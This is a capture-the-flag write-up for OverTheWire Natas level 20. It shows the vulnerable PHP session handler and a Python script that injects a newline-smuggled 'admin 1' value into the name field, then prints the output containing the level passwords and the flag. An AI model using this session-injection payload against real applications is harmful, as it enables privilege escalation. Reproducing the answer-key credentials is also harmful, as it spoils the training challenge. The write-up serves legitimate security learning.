# Level 20
## What does the page look like?
```php
$ curl -s --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF http://natas20.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
<form action="index.php" method="POST">
Your name: <input name="name" value=""><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Source code
```php
$ curl -s --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF http://natas20.natas.labs.overthewire.org/index-source.html | html2text 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "<censored>" };</
script></head>
<body>
<h1>natas20</h1>
<div id="content">
<?

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION
["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) { 
    //debug("MYOPEN $path $name"); 
    return true; 
}

/* we don't need this */
function myclose() { 
    //debug("MYCLOSE"); 
    return true; 
}

function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn
($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-
") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn
($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-
") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid"); 
    return true; 
}
/* we don't need this */
function mygarbage($t) { 
    //debug("MYGARBAGE $t"); 
    return true; 
}

session_set_save_handler(
    "myopen", 
    "myclose", 
    "myread", 
    "mywrite", 
    "mydestroy", 
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

<form action="index.php" method="POST">
Your name: <input name="name" value="<?=$name?>"><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Custom session file
The print_credentials() function will reveal the password when the page loads only if `$_SESS['admin']` is equal to `1`.

Now, having a close look at the way the functions mywrite() and myread() are written reveals that the session file is a list of keys and values separated with a space. Besides, the `myread()` function will not only read the file, but also create the session variables based on that file.

*Extract of myread() function:*
```php
$data = file_get_contents($filename);
foreach(explode("\n", $data) as $line) {
    $parts = explode(" ", $line, 2);
	if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
}
```

*Extract of mywrite() function:*
```php
$filename = session_save_path() . "/" . "mysess_" . $sid;
$data = "";
foreach($_SESSION as $key => $value) {
    $data .= "$key $value\n";
}
file_put_contents($filename, $data);
```

## Scripting
With that in mind, if we could add `admin 1` to the session file would set `$_SESSION['admin']` to `1`, which is our objective.

Let's inject the following value to the user field: `whatever\nadmin 1`

```python
#!/usr/bin/env python3
import requests

auth_user = 'natas20'
auth_pass = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
target = 'http://natas20.natas.labs.overthewire.org'

data = {'name':'whatever\nadmin 1'}
s = requests.Session()

# First send our payload (POST)
r1 = s.post(
	target,
	auth=(auth_user, auth_pass),
	data=data
	)

# Refresh page and get content
r2 = s.get(
	target,
	auth=(auth_user, auth_pass),
	)
print(r2.text)
```

Here is the output that reveals the flag.
```php
$ python flag.py 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>
<form action="index.php" method="POST">
Your name: <input name="name" value="whatever"><br>
<input type="submit" value="Change name" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

# Flag
~~~
natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ
~~~